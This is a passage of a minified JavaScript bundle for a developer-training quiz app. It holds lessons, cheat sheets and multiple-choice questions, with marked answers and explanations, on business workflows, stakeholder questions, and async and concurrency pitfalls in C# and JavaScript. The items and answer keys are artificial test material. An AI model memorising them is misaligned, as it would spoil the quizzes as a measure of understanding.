await db.SaveChangesAsync();`},choices:["`SaveChangesAsync` will throw an exception","`decimal` is the wrong type for money","Nothing — EF Core updates Total automatically","Any code can add a line without updating Total"],answer:3,why:"Public setters and a public list let any code change the order without keeping the rule. Make the list private and add a method like `AddLine` that also updates Total (or compute Total from the lines)."},{id:"business.invariants.4",kind:"mcq",difficulty:"easy",prompt:"Which of these is an invariant?",choices:['"The home page should load in under 2 seconds"','"In a transfer, the debit always equals the credit"','"Buttons should be blue"','"We deploy on Tuesdays"'],answer:1,why:"An invariant is a rule about the data that must hold every time. The others are goals or habits, not rules the data must obey."}]},{id:"business.workflows",title:"Workflows and state machines",summary:"Draw the states. Draw the allowed moves.",minutes:4,blocks:[{type:"text",text:"Many business objects move through **states**. An order goes Draft → Placed → Paid → Shipped. Not every move is allowed. Drawing the states and moves catches bugs before they are written."},{type:"diagram",text:`Draft ──publish──► Published ──run──► Processing
  ▲                  │  ▲                 │
  └───unpublish──────┘  └────finished─────┘
                     │
                  archive
                     ▼
              Archived (final)`},{type:"text",text:`For each **state**, ask: which actions are allowed? Who can do them?
For each **arrow**, ask: what triggers it? What if it fails halfway?`},{type:"code",code:{lang:"ts",text:`type Status = 'Draft' | 'Published' | 'Processing' | 'Archived';

const allowed: Record<Status, Status[]> = {
  Draft:      ['Published'],
  Published:  ['Draft', 'Processing', 'Archived'],
  Processing: ['Published'],
  Archived:   [],
};

const canMove = (from: Status, to: Status) =>
  allowed[from].includes(to);`}},{type:"example",title:"Boolean soup",text:'`IsPublished`, `IsProcessing` and `IsArchived` as three booleans allow 8 combinations. What does "published + archived + processing" mean? Nobody knows.\nOne `Status` field allows only the states you defined.'},{type:"text",text:'A table of allowed moves is easy to **test** and easy to **show to the business**. "Can an archived scenario go back to draft?" is a quick question when the diagram is on the screen.'}],remember:"Draw the states and arrows. No arrow means not allowed.",questions:[{id:"business.workflows.1",kind:"code",difficulty:"easy",prompt:"Using this table, what does `canMove('Archived', 'Draft')` return?",code:{lang:"ts",text:`const allowed: Record<Status, Status[]> = {
  Draft:      ['Published'],
  Published:  ['Draft', 'Processing', 'Archived'],
  Processing: ['Published'],
  Archived:   [],
};
const canMove = (from: Status, to: Status) =>
  allowed[from].includes(to);`},choices:["true","false","It throws an error","undefined"],answer:1,why:'`Archived` has an empty list, so no move out of it is allowed. Archived is a final state. If the business wants "restore", that is a new arrow they must agree on.'},{id:"business.workflows.2",kind:"debug",difficulty:"medium",prompt:"Support finds an order with `IsPaid = true`, `IsCancelled = true` and `IsShipped = true` at the same time. What design problem allowed this?",choices:["Separate booleans allow impossible combinations","The database is missing an index on IsPaid","The app does not write enough logs","The order table has too many rows"],answer:0,why:"Three booleans give 8 combinations, and some make no sense. One `Status` field with allowed moves (for example, no cancel after ship) makes the impossible state impossible.",remember:"One status field beats a pile of booleans."},{id:"business.workflows.3",kind:"scenario",difficulty:"hard",prompt:'The flow is Placed → Paid → Shipped → Delivered. A new requirement: "Users can cancel an order." What should you ask?',choices:['"Should we add an `IsCancelled` boolean to the table?"','"Should the API use POST /cancel or DELETE /orders/{id}?"','"In which UI screens should the Cancel button appear?"','"From which states can you cancel, and what happens to money and stock?"'],answer:3,why:"Cancelling a Placed order is easy. Cancelling a Paid one means a refund. Cancelling a Shipped one means a return. Each arrow into Cancelled has different business effects."},{id:"business.workflows.4",kind:"scenario",difficulty:"medium",prompt:"A background job moves scenarios from Processing back to Published when it finishes. Sometimes the job crashes, and scenarios stay in Processing for days. Users cannot edit them. What business question does this raise?",choices:['"Can we restart the server every night to clear stuck jobs?"','"How long may it stay in Processing? Then retry, alert or reset?"','"Can we just delete the stuck rows from the table by hand?"','"Can we hide the Processing state so users can edit anyway?"'],answer:1,why:'Every "in progress" state needs a way out when things fail. How long is too long and what happens then are business choices: retry, alert someone, or move back to a safe state.',remember:'Every "in progress" state needs a timeout plan.'}]},{id:"business.asking-questions",title:"Ask stakeholders the right questions",summary:"Concrete examples, clear options, written answers.",minutes:3,blocks:[{type:"text",text:"Stakeholders know the business. You know what the code needs. Good questions connect the two."},{type:"compare",left:{title:"Weak questions ⚠️",items:['"Any edge cases?"','"How should it work?"','"Is that OK?"',"Vague question → vague answer"]},right:{title:"Strong questions ✅",items:["Use a real example",'Offer options: "A or B?"',"One decision per question","Easy to answer in 10 seconds"]}},{type:"example",title:"Weak vs strong",text:`Weak: "What about cancellations?"
Strong: "If a customer cancels after 1 of 3 items shipped, do we refund everything, only the unshipped item, or nothing?"`},{type:"list",items:['**Turn vague words into numbers**: "fast" → "under 1 s for 95% of searches". "Soon" → a date. "Many" → how many?',"**Ask who decides**: each rule needs one owner. When two people disagree, say so out loud.","**Write it down**: send a short summary after the meeting. Decisions in a call get forgotten."]},{type:"example",title:"A good summary message",text:`Decided: cancel is allowed until the order ships.
Partly shipped: refund only unshipped items.
Owner: Anna (Sales).
Open question: what about gift cards?`}],remember:'Ask concrete "A or B?" questions with real examples. Then write the answers down.',questions:[{id:"business.asking-questions.1",kind:"compare",difficulty:"easy",prompt:"Which question will get a more useful answer from the product owner?",choices:['"Are there any edge cases we should think about?"','"If a coupon expires while the user is paying, do we accept it?"'],answer:1,why:'A concrete situation with a yes/no choice is easy to answer. "Any edge cases?" usually gets "No, I think it’s fine".'},{id:"business.asking-questions.2",kind:"scenario",difficulty:"medium",prompt:'The requirement says: "Search must be fast." What do you do?',choices:['Assume "fast" means under 10 ms and build for that',"Agree on a number with the stakeholder, like p95 under 1 s","Pick the fastest search engine and stop worrying","Ignore it — every search feels fast in development"],answer:1,why:'"Fast" means different things to different people. A number (and the data size it applies to) gives you a clear target and tells you when you are done.',remember:"Vague word → ask for a number."},{id:"business.asking-questions.3",kind:"scenario",difficulty:"hard",prompt:'In a meeting, Sales says: "Refunds are automatic and instant." Finance says: "Refunds over 500 € need manager approval." What do you do next?',choices:["Build the Sales version, since it is better for customers","Build the Finance version, since money rules are always stricter","Name the conflict, ask who owns refund rules, record the answer","Quietly build both behind a setting, and let them pick later"],answer:2,why:"The two rules cannot both be true for a 600 € refund. Developers should not pick a winner. Make the conflict visible, get the owner to decide, and record it.",remember:"Conflicting rules → find the owner, do not pick a side."},{id:"business.asking-questions.4",kind:"mcq",difficulty:"medium",prompt:"In a call, the product owner answers 6 of your edge-case questions. What is the best next step?",choices:["Trust your memory and start coding while the answers are fresh","Write nothing down — the code and tests will be the documentation","Post a summary of decisions and open questions in the ticket","Ask the same questions again next week, to double-check answers"],answer:2,why:"A written summary lets the PO correct misunderstandings now, and lets testers and future developers see why the code works this way."}]}],cheatSheet:[{title:"Before you build",items:[{term:'Ask "Why?"',meaning:"A request is a solution — find the problem behind it"},{term:"Hard constraint",meaning:"Law, contract, policy → ask for the exact rule"},{term:"Success measure",meaning:'"How will we know it worked?"'},{term:"Glossary",meaning:"Term, meaning, example, owner"},{term:"Ubiquitous language",meaning:"Same words in meetings and in code"}]},{title:'"What if…?" checklist',items:[{term:"In progress",meaning:"It is half done / being processed right now"},{term:"At the same time",meaning:"Two users or two requests act at once"},{term:"Late",meaning:"One minute after the deadline or expiry"},{term:"Reversed",meaning:"Cancel, refund, undo after part already happened"},{term:"Money",meaning:"Rounding, negative totals, currency"},{term:"People",meaning:"User deleted, role changed, left the company"}]},{title:"Rules and states",items:[{term:"Business rule",meaning:"A decision the business owns — not the developer"},{term:"Invariant",meaning:"Must always be true — enforce close to the data"},{term:"DB constraint",meaning:"Last safety net: UNIQUE, CHECK, FK"},{term:"Check-then-act",meaning:"Not safe under load → atomic check or constraint"},{term:"State machine",meaning:"Status + allowed moves; no arrow = not allowed"},{term:"Boolean soup",meaning:"Many flags → impossible combinations"}]},{title:"Asking stakeholders",items:[{term:"Concrete example",meaning:"Real names, numbers and dates"},{term:'"A or B?"',meaning:"Options are faster to answer than open questions"},{term:"Vague word",meaning:'"fast", "soon", "real-time" → ask for a number'},{term:"Owner",meaning:"One person decides each rule"},{term:"Write it down",meaning:"Summary of decisions + open questions in the ticket"}]}]},c=Object.freeze(Object.defineProperty({__proto__:null,default:h},Symbol.toStringTag,{value:"Module"})),l={id:"concurrency",title:"Async & Concurrency",emoji:"🔄",tagline:"Tasks, races, locks — when two things happen at once",lessons:[{id:"concurrency.basics",title:"Process, thread, task",summary:"Who actually runs your code.",minutes:3,blocks:[{type:"text",text:`A **process** is a running program. It has its own memory. Two processes cannot read each other's variables.
A **thread** is a worker inside a process. All threads of one process **share the same memory**.`},{type:"diagram",text:`Process: MyApi.exe  (own memory)
┌────────────────────────────────────┐
│  shared memory: caches, statics    │
│                                    │
│  Thread 1   Thread 2   Thread 3    │
│     │          │          │        │
│  request A  request B  request C   │
└────────────────────────────────────┘
Process: MyWorker.exe  (separate memory)`},{type:"text",text:"A **task** (`Task` in C#, `Promise` in JS) is **a piece of work that will finish later**. It is not a thread. Many tasks can share a few threads, because most tasks spend their time **waiting** (for the database, the network, a file)."},{type:"example",title:"Restaurant",text:"Threads are the waiters. Tasks are the orders. A good waiter does not stand at the kitchen door waiting for one dish. They take other orders and come back when the dish is ready."},{type:"text",text:"Shared memory is fast and convenient. It is also where most concurrency bugs live: two threads changing the same object at the same time."}],remember:"Process = own memory. Threads = share memory. Task = work that finishes later.",questions:[{id:"concurrency.basics.1",kind:"scenario",difficulty:"easy",prompt:"Your API runs as **2 separate processes** on one machine. Each keeps an in-memory cache in a static `Dictionary`. Process 1 clears its cache. What happens to the cache in process 2?",choices:["It is cleared too, because both run the same code","Process 2 throws an exception on its next read","Nothing — each process has its own memory","It is cleared after a short sync delay"],answer:2,why:"Processes do not share memory. Each one has its own copy of every static field, so clearing one cache does not touch the other.",remember:"Separate processes = separate memory."},{id:"concurrency.basics.2",kind:"mcq",difficulty:"medium",prompt:"An ASP.NET Core server handles 2,000 requests at the same time with only about 50 threads. How is that possible?",choices:["Each request gets its own CPU core for a moment","The server queues requests and runs them one by one","Each thread runs many requests at the same instant","Waiting requests give their thread back to the pool"],answer:3,why:"While a request awaits the database or network, its thread goes back to the pool and serves someone else. Threads are only needed while code is actually running."},{id:"concurrency.basics.3",kind:"truefalse",difficulty:"easy",prompt:"Every `Task` you create in C# gets its own dedicated thread.",choices:["True","False"],answer:1,why:"A task is a promise of a future result, not a thread. An I/O task may use no thread at all while it waits. Threads from a shared pool run the code before and after each wait."}]},{id:"concurrency.async-await",title:"async / await: waiting without blocking",summary:"What really happens at an await.",minutes:4,blocks:[{type:"text",text:'`await` means: "pause **this method** until the task is done, but **let the thread do other work** meanwhile."'},{type:"compare",left:{title:"Blocking ⚠️",items:["`Thread.Sleep`, `.Result`, `.Wait()`","The thread sits idle and waits","Nobody else can use it"]},right:{title:"Awaiting ✅",items:["`await Task.Delay`, `await GetAsync()`","The method pauses","The thread goes back to help others"]}},{type:"code",code:{lang:"csharp",text:`public async Task<Order> GetOrder(int id)
{
    // runs on a pool thread
    var order = await db.Orders.FindAsync(id);
    // thread was released during the DB call,
    // now a pool thread continues here
    return order;
}`}},{type:"text",text:"An async method runs **normally (synchronously)** until it hits the first `await` of a task that is not finished yet. Only then does it return to the caller."},{type:"text",text:"**JavaScript** is different: your code runs on **one thread** (the event loop). `await` lets the loop run other callbacks while you wait. If your code does heavy CPU work without awaiting, **everything else waits** — other requests, clicks, timers."},{type:"diagram",text:`JS event loop (one thread)
  run sync code until it ends or awaits
        ↓
  run all microtasks (promise callbacks)
        ↓
  run next macrotask (timer, I/O event)
        ↓
  repeat`}],remember:"await = pause the method, not the thread.",questions:[{id:"concurrency.async-await.1",kind:"code",difficulty:"medium",prompt:"What does this C# code print?",code:{lang:"csharp",text:`async Task WorkAsync()
{
    Console.WriteLine("2");
    await Task.Delay(100);
    Console.WriteLine("4");
}

Console.WriteLine("1");
var t = WorkAsync();
Console.WriteLine("3");
await t;`},choices:["1 2 3 4","1 3 2 4","1 2 4 3","1 3 4 2"],answer:0,why:'WorkAsync runs synchronously until its first real await, so "2" prints right away. Then it returns a task, "3" prints, and "4" comes after the delay.',remember:"Async methods run synchronously until the first await."},{id:"concurrency.async-await.2",kind:"code",difficulty:"hard",prompt:"What does this JavaScript print?",code:{lang:"js",text:`console.log('A');
setTimeout(() => console.log('B'), 0);
Promise.resolve().then(() => console.log('C'));
console.log('D');`},choices:["A B C D","A D B C","A D C B","A C D B"],answer:2,why:"Sync code runs first (A, D). Then the microtask queue runs (promise callback C). Only then the timer callback runs (B), even with a 0 ms delay.",remember:"Sync → microtasks (promises) → timers."},{id:"concurrency.async-await.3",kind:"perf",difficulty:"medium",prompt:"A Node.js API has one endpoint that builds a big report with a 2-second CPU loop (no awaits). While it runs, **all** other endpoints stop responding. Why?",choices:["Node.js allows one request per endpoint at a time","The loop keeps the only JS thread busy","The report holds a lock on the database","Garbage collection pauses during long loops"],answer:1,why:"All JS code shares one event loop thread. A long synchronous loop keeps it busy, so other requests cannot even start. Move heavy CPU work to a worker thread or another service.",remember:"Never block the event loop with long CPU work."},{id:"concurrency.async-await.4",kind:"compare",difficulty:"easy",prompt:"Inside an ASP.NET Core controller you need to wait 5 seconds before retrying a call. Which is better?",choices:["`Thread.Sleep(5000);`","`Task.Delay(5000).Wait();`","`await Task.Delay(5000);`"],answer:2,why:"`Thread.Sleep` and `.Wait()` both hold a pool thread doing nothing for 5 seconds. `await Task.Delay` gives the thread back so it can serve other requests."}]},{id:"concurrency.parallel",title:"Concurrency vs parallelism",summary:"Many things in progress vs many things at the same instant.",minutes:3,blocks:[{type:"text",text:`**Concurrency** = several tasks are **in progress** at the same time. They may take turns on one thread.
**Parallelism** = several tasks run at the **exact same moment**, on different CPU cores.`},{type:"diagram",text:`Concurrency (1 cook, 3 dishes, switching)
  cook: [A][B][A][C][B][C]

Parallelism (3 cooks, 3 dishes, together)
  cook 1: [A A A]
  cook 2: [B B B]
  cook 3: [C C C]`},{type:"text",text:"For **waiting work** (HTTP, DB), start everything first, then wait for all. You do not need more threads for that."},{type:"code",code:{lang:"ts",text:`// Sequential: 3 calls × 200 ms ≈ 600 ms
const a = await getUser(id);
const b = await getOrders(id);
const c = await getInvoices(id);

// Concurrent: all start now ≈ 200 ms
const [a2, b2, c2] = await Promise.all([
  getUser(id), getOrders(id), getInvoices(id),
]);`}},{type:"text",text:'C# has the same idea: start the tasks, then `await Task.WhenAll(t1, t2, t3)`.\nCaution: "start everything" with 10,000 items floods the other server. Limit how many run at once (for example `Parallel.ForEachAsync` with `MaxDegreeOfParallelism`, or a `SemaphoreSlim`).'}],remember:"Independent waits → start all, then await all. But cap the number.",questions:[{id:"concurrency.parallel.1",kind:"perf",difficulty:"easy",prompt:"This page loads in 2 seconds. Each `fetchUser` takes about 200 ms and the calls do not depend on each other. What is the best fix?",code:{lang:"ts",text:`const users = [];
for (const id of ids) {          // 10 ids
  users.push(await fetchUser(id));
}`},choices:["Store the results in a `Map` instead of an array","Switch to a classic `for (let i = 0; ...)` loop","Wrap each call in its own `try/catch`","Use `Promise.all(ids.map(fetchUser))`"],answer:3,why:"The loop waits for each call before starting the next: 10 × 200 ms. `Promise.all` starts all 10 at once, so the total is about one call's time.",remember:"await in a loop = one at a time."},{id:"concurrency.parallel.2",kind:"scenario",difficulty:"hard",prompt:"A nightly job does `await Promise.all(customers.map(sendToCrm))` for 50,000 customers. The CRM starts returning `429 Too Many Requests` and the job fails. What is the best fix?",choices:["Run them with a limit, e.g. 10 at a time","Switch to a plain sequential `for` loop","Retry the whole job right away on 429","Use `Promise.allSettled` instead of `Promise.all`"],answer:0,why:"Starting 50,000 requests at once overloads the CRM. A limit keeps it fast but polite. A sequential loop works but takes hours, and `allSettled` only changes how errors are reported.",remember:"Unlimited concurrency is a denial-of-service attack on your partner."},{id:"concurrency.parallel.3",kind:"mcq",difficulty:"medium",prompt:"You resize 1,000 images (pure CPU work) in a C# console app. Which helps the most on an 8-core machine?",choices:["Make each resize method `async` and await it","Add `ConfigureAwait(false)` to every await","Use `Parallel.ForEach` across the cores","Run it on one thread with a tighter loop"],answer:2,why:"async/await helps when you wait for I/O. CPU work needs more cores working at the same time, which is parallelism.",remember:"I/O-bound → async. CPU-bound → parallel."}]},{id:"concurrency.race",title:"Race conditions",summary:"When the result depends on who finishes first.",minutes:4,blocks:[{type:"text",text:"A **race condition** happens when two tasks access the same data at the same time and the result depends on which one finishes first."},{type:"text",text:"Even `count++` is not one step. It is **read**, **add 1**, **write**. Two threads can interleave:"},{type:"diagram",text:`count = 5
Thread A: read 5 ─────────────── write 6
Thread B:      read 5 ── write 6
Result: 6   (expected 7 — one update is lost)`},{type:"text",text:"The most common shape is **check-then-act**: you check something, then act on it, but the world changed in between."},{type:"code",code:{lang:"csharp",text:`if (account.Balance >= amount)       // check
{
    // another request can withdraw here!
    account.Balance -= amount;        // act
}`}},{type:"text",text:"**JavaScript too.** It has one thread, so `count++` is safe. But every `await` is a gap where other code can run."},{type:"code",code:{lang:"ts",text:`async function withdraw(id: string, amount: number) {
  const balance = await getBalance(id);   // gap
  if (balance >= amount) {
    await setBalance(id, balance - amount); // gap
  }
}
// two calls at once can both see the old balance`}},{type:"example",title:"Why races are nasty",text:"They pass every test on your laptop. They show up in production once a week, under load, and nobody can reproduce them."}],remember:"Shared data + no coordination + bad timing = race condition.",questions:[{id:"concurrency.race.1",kind:"code",difficulty:"medium",prompt:"What does this print?",code:{lang:"csharp",text:`int count = 0;
var tasks = Enumerable.Range(0, 1000)
    .Select(_ => Task.Run(() =>
    {
        for (int i = 0; i < 1000; i++) count++;
    }));
await Task.WhenAll(tasks);
Console.WriteLine(count);`},choices:["Always 1,000,000, because `Task.WhenAll` waits for all","Usually less than 1,000,000, different each run","Always 1,000 — one per task","It throws an `InvalidOperationException`"],answer:1,why:"`count++` is read-add-write. Tasks on different threads overwrite each other's updates, so some increments are lost. .NET does not detect this for you.",remember:"`count++` is not atomic."},{id:"concurrency.race.2",kind:"debug",difficulty:"medium",prompt:"Users sometimes get **two** welcome emails after signing up. The code checks `if (!user.WelcomeSent)`, sends the email, then sets `WelcomeSent = true`. Signup can fire this code from two places at once. What is the most likely cause?",choices:["The email provider retries the send and delivers duplicates","The compiler evaluates the `if` condition twice","The SMTP client is not thread-safe","Both runs read `false` before either one saves `true`"],answer:3,why:"A check-then-act race: both callers check before either one writes the flag. Make the check and the update one atomic step, e.g. `UPDATE ... SET WelcomeSent = 1 WHERE Id = @id AND WelcomeSent = 0` and send only if 1 row changed.",remember:"Check-then-act needs to be one atomic step."},{id:"concurrency.race.3",kind:"truefalse",difficulty:"medium",prompt:"Because Node.js runs JavaScript on one thread, async code in Node.js cannot have race conditions.",choices:["True","False"],answer:1,why:"One line of JS never runs at the same time as another. But between two `await`s, other requests can run and change shared state, so read-then-write logic can still race."},{id:"concurrency.race.4",kind:"scenario",difficulty:"hard",prompt:"A singleton service in ASP.NET Core keeps `private readonly List<string> _recent = new();` and every request calls `_recent.Add(...)`. Under load you see rare `IndexOutOfRangeException`s inside `List.Add`. What is going on?",choices:["Many threads call `Add` on one list at once","The list grew beyond its maximum capacity of items","A known bug in `List<T>` on older .NET versions","The garbage collector moved the list during `Add`"],answer:0,why:"A singleton is shared by all requests, which run on many threads. `List<T>` is not safe for concurrent writes, so its internal array and count can get out of sync.",remember:"Singleton + mutable collection = shared state across threads."}]},{id:"concurrency.locks",title:"Locks and thread-safe tools",summary:"Let only one thread in at a time.",minutes:4,blocks:[{type:"text",text:"A **lock** lets only one thread run a piece of code at a time. Others wait at the door. Code is **thread-safe** when it works correctly even if many threads call it at once."},{type:"code",code:{lang:"csharp",text:`private readonly object _gate = new();
private decimal _balance;

public bool Withdraw(decimal amount)
{
    lock (_gate)              // one thread at a time
    {
        if (_balance < amount) return false;
        _balance -= amount;   // check + act are now safe
        return true;
    }
}`}},{type:"text",text:"You cannot `await` inside `lock` — the compiler rejects it. For async code, use `SemaphoreSlim`:"},{type:"code",code:{lang:"csharp",text:`private readonly SemaphoreSlim _sem = new(1, 1);

await _sem.WaitAsync();
try
{
    await RefreshTokenAsync();
}
finally
{
    _sem.Release();   // always release, even on error
}`}},{type:"list",items:["`Interlocked.Increment(ref count)` — atomic counter, no lock needed.","`ConcurrentDictionary` — safe for many readers and writers.","`lock` — protect a few lines that touch shared state. Keep it short.","`SemaphoreSlim` — like a lock that works with `await`, or allow N at a time."]},{type:"text",text:"Locks only work **inside one process**. If you run 3 copies of your API, each has its own lock. For that, see the Distributed Systems category."}],remember:"Short lock for sync code. SemaphoreSlim for async code. Interlocked for counters.",questions:[{id:"concurrency.locks.1",kind:"code",difficulty:"easy",prompt:"Why does this not compile?",code:{lang:"csharp",text:`lock (_gate)
{
    var token = await LoadTokenAsync();
    _cache = token;
}`},choices:["The lock object `_gate` must be a `string`","`lock` needs a timeout argument when used in async code","`await` is not allowed inside a `lock` block","Fields cannot be assigned inside a `lock` block"],answer:2,why:"A `lock` is tied to the thread that took it, but after an `await` the code may continue on another thread. C# forbids it. Use `SemaphoreSlim.WaitAsync` instead.",remember:"No await in lock → SemaphoreSlim."},{id:"concurrency.locks.2",kind:"compare",difficulty:"easy",prompt:"Many threads increment a shared `int` request counter. Which is the best choice?",choices:["`count++` and hope for the best","`Interlocked.Increment(ref count)`","A `lock` around a `Thread.Sleep(1)` and `count++`"],answer:1,why:"`Interlocked.Increment` is atomic and very cheap. Plain `count++` loses updates. Sleeping inside a lock only makes everyone wait longer."},{id:"concurrency.locks.3",kind:"perf",difficulty:"medium",prompt:'A team wraps a whole request handler in one global `lock` to "fix" a race. The bug is gone, but throughput drops from 800 to 40 requests/second. Why?',choices:["Requests now run one at a time","Each lock allocates a lot of memory","The lock adds a database round trip","The lock turns off the thread pool"],answer:0,why:"A lock serializes everything inside it. Protect only the few lines that touch shared state, or use a thread-safe type, so the rest can still run in parallel.",remember:"Lock as little code as possible."},{id:"concurrency.locks.4",kind:"debug",difficulty:"hard",prompt:"You use `cache.GetOrAdd(key, k => LoadExpensive(k))` on a `ConcurrentDictionary`. Logs show `LoadExpensive` sometimes runs **twice** for the same key. Why?",choices:["`ConcurrentDictionary` is not thread-safe for writes","Two different dictionary instances were created","`GetOrAdd` always calls the factory twice by design","Two threads ran the factory; one result was kept"],answer:3,why:"GetOrAdd keeps the dictionary consistent, but it does not lock while your factory runs. If the factory must run once, store `Lazy<T>` values or use a lock/semaphore around the load.",remember:"Thread-safe collection ≠ your factory runs once."}]},{id:"concurrency.deadlock",title:"Deadlocks and starvation in code",summary:"When everybody waits and nobody works.",minutes:4,blocks:[{type:"text",text:"A **deadlock** in code: two threads each hold something the other needs, so both wait forever. No error. No CPU. The app just hangs."},{type:"diagram",text:`Thread 1: lock(A) ── wants B ──┐
                               ▼
Thread 2: lock(B) ── wants A ──┘
Fix: always take locks in the same order`},{type:"text",text:"The classic .NET async deadlock: **blocking on async code** with `.Result` or `.Wait()` in an app that has a UI thread (WinForms, WPF) or in old ASP.NET."},{type:"code",code:{lang:"csharp",text:`// WPF button click
void Load_Click(object sender, RoutedEventArgs e)
{
    var text = LoadAsync().Result;   // UI thread blocks
}

async Task<string> LoadAsync()
{
    var s = await http.GetStringAsync(url);
    return s;  // wants to continue on the UI thread,
}              // but the UI thread is blocked → hang`}},{type:"text",text:"ASP.NET Core has no UI thread, so this exact hang is rare there. But blocking is still bad: each `.Result` holds a pool thread doing nothing. Under load the pool runs out of threads (**thread-pool starvation**), and new threads are added slowly. Requests queue up while CPU looks idle."},{type:"list",items:['Use `await` all the way up ("async all the way").',"Never call `.Result` / `.Wait()` / `GetAwaiter().GetResult()` on hot paths.","Take multiple locks in one fixed order."]}],remember:"Don't block on async code. Await it.",questions:[{id:"concurrency.deadlock.1",kind:"debug",difficulty:"medium",prompt:'A WPF app freezes forever when you click "Load". The click handler calls `GetDataAsync().Result`. There is no exception. What is the most likely cause?',choices:["The server is too slow and has no timeout","UI thread and task wait for each other","WPF does not allow HTTP calls on the UI thread","The task was created but never started"],answer:1,why:"`.Result` blocks the UI thread. The code after `await` inside GetDataAsync wants to resume on the UI thread. Each waits for the other: deadlock. Make the handler `async` and `await` the call."},{id:"concurrency.deadlock.2",kind:"perf",difficulty:"hard",prompt:"An ASP.NET Core API gets very slow at peak traffic. CPU is only 15%, the database is fine, but the thread count keeps climbing and latency is seconds. The code has many `.Result` calls on HTTP requests to another service. What is happening?",choices:["The database is deadlocked on the hot tables","The JSON serializer is too slow under load","Thread-pool starvation from blocked threads","The garbage collector is pausing all threads"],answer:2,why:"Each blocked call holds a pool thread that does nothing. The pool adds threads slowly, so incoming work queues up even though CPU is low. Replace `.Result` with `await`.",remember:"Low CPU + rising thread count + slow requests → look for blocking calls."},{id:"concurrency.deadlock.3",kind:"scenario",difficulty:"medium",prompt:"`Transfer(a, b)` does `lock(a) { lock(b) { ... } }`. Two requests run `Transfer(acc1, acc2)` and `Transfer(acc2, acc1)` at the same time, and the app hangs. What is the simplest fix?",choices:["Lock accounts in a fixed order, e.g. lower id first","Remove both locks and rely on `decimal` being atomic","Add a short `Thread.Sleep` between the two locks","Run every transfer on a background thread"],answer:0,why:"The hang is a cycle: each request holds one account and waits for the other. If everyone locks in the same order (by id), the cycle cannot form."},{id:"concurrency.deadlock.4",kind:"compare",difficulty:"easy",prompt:"You are inside an `async Task` method in ASP.NET Core and need the result of `GetPriceAsync()`. Which is better?",choices:["`var p = GetPriceAsync().Result;`","`var p = await GetPriceAsync();`"],answer:1,why:"`await` frees the thread while waiting. `.Result` blocks a thread and can cause deadlocks or thread-pool starvation."}]},{id:"concurrency.pitfalls",title:"Async traps: async void, missing await, lost errors",summary:"Small mistakes that hide errors.",minutes:4,blocks:[{type:"text",text:"Async bugs often have **no error message**. The error happened, but nobody was listening."},{type:"list",items:["**Forgetting `await`** — the work starts, the code moves on, and errors are lost. The work may not even be finished when you use its result.","**`async void`** (C#) — the caller cannot await it or catch its exceptions. An exception there can crash the whole process. Only use it for event handlers.","**Unhandled promise rejection** (JS) — a rejected promise nobody awaits or `.catch`es. Modern Node.js crashes the process on it by default.","**Fire-and-forget** — starting work without waiting. Fine only if you log its errors and accept that it can be lost on restart."]},{type:"code",code:{lang:"ts",text:`try {
  saveAudit(entry);        // ❌ no await
} catch (e) {
  log(e);                  // never runs for async errors
}

try {
  await saveAudit(entry);  // ✅ errors land in catch
} catch (e) {
  log(e);
}`}},{type:"code",code:{lang:"csharp",text:`// ❌ caller can't await or catch
public async void SendEmail() { ... }

// ✅ return a Task
public async Task SendEmailAsync() { ... }`}},{type:"text",text:"Turn on the warnings: in C#, CS4014 warns when you call an async method without awaiting it. In TypeScript, the ESLint rule `no-floating-promises` does the same."}],remember:"Every task/promise should be awaited, returned, or explicitly handled.",questions:[{id:"concurrency.pitfalls.1",kind:"debug",difficulty:"medium",prompt:'A save button shows "Saved!" but sometimes the data is not in the database, and there is no error in the logs. The code is below. What is wrong?',code:{lang:"ts",text:`async function onSave() {
  try {
    api.saveOrder(order);
    showToast('Saved!');
  } catch (e) {
    showError(e);
  }
}`},choices:["`showToast` must be awaited before the request ends","`try/catch` does not work inside `async` functions","`saveOrder` is not awaited, so errors skip `catch`","`onSave` should not be marked `async` at all"],answer:2,why:"Without `await`, the toast shows right after the request starts. If the request fails later, the rejection happens outside the try block, so the catch never sees it.",remember:"No await → no catch."},{id:"concurrency.pitfalls.2",kind:"scenario",difficulty:"hard",prompt:"In an ASP.NET Core service, a teammate writes `public async void NotifyAsync()` and calls it after saving an order. One day the notification server is down and the **whole API process crashes**. Why?",choices:["The notification server sent back a kill signal","ASP.NET Core forbids async methods in singleton services","The order was saved twice and hit a constraint","Nobody can catch an exception from `async void`"],answer:3,why:"An `async void` method has no Task to carry its exception. The exception is thrown where nobody can catch it, which can crash the process. Return `Task` and await it, or catch inside.",remember:"async void only for event handlers."},{id:"concurrency.pitfalls.3",kind:"mcq",difficulty:"medium",prompt:"You call `Promise.all([a(), b(), c()])` and `b()` rejects after 50 ms. What happens to `a()` and `c()`?",choices:["They are cancelled automatically","They keep running in the background","They are retried once automatically","`Promise.all` waits for them, then rejects"],answer:1,why:"Promises cannot be cancelled by Promise.all. It rejects at the first failure, while the other operations keep going in the background. Use `Promise.allSettled` if you need every result."}]}],cheatSheet:[{title:"Basics",items:[{term:"Process",meaning:"Running program with its own memory"},{term:"Thread",meaning:"Worker inside a process — shares memory with other threads"},{term:"Task / Promise",meaning:"Work that finishes later. Not a thread"},{term:"await",meaning:"Pause the method, free the thread"},{term:"Concurrency",meaning:"Many things in progress, may take turns"},{term:"Parallelism",meaning:"Many things at the exact same moment, on many cores"},{term:"JS event loop",meaning:"One thread: sync code → microtasks (promises) → timers / I/O"}]},{title:"Thread safety (C#)",items:[{term:"Race condition",meaning:"Result depends on timing; often check-then-act or count++"},{term:"lock",meaning:"One thread at a time; no await inside"},{term:"SemaphoreSlim(1,1)",meaning:"Async-friendly lock: WaitAsync + try/finally Release"},{term:"Interlocked",meaning:"Atomic counters and swaps, no lock"},{term:"ConcurrentDictionary",meaning:"Thread-safe map; GetOrAdd factory may run twice"},{term:"Singleton + List<T>",meaning:"Shared by all requests → not thread-safe"}]},{title:"Common traps",items:[{term:".Result / .Wait()",meaning:"Blocks a thread → deadlock (UI) or thread-pool starvation"},{term:"async void",meaning:"Cannot be awaited or caught — event handlers only"},{term:"Missing await",meaning:"Errors skip your catch, work may not be done yet"},{term:"await in a loop",meaning:"Runs one by one → Promise.all / Task.WhenAll"},{term:"Promise.all on 50k items",meaning:"Floods the other side → limit concurrency"},{term:"Deadlock (code)",meaning:"Locks taken in different orders → use one fixed order"}]}]},u=Object.freeze(Object.defineProperty({__proto__:null,default:l},Symbol.toStringTag,{value:"Module"})),m={id:"data-structures",title:"Data Structures",emoji:"🧱",tagline:"List, Map, Set, Queue, Tree — pick the right box",lessons:[{id:"data-structures.array-list",title:"Array and List",summary:"A row 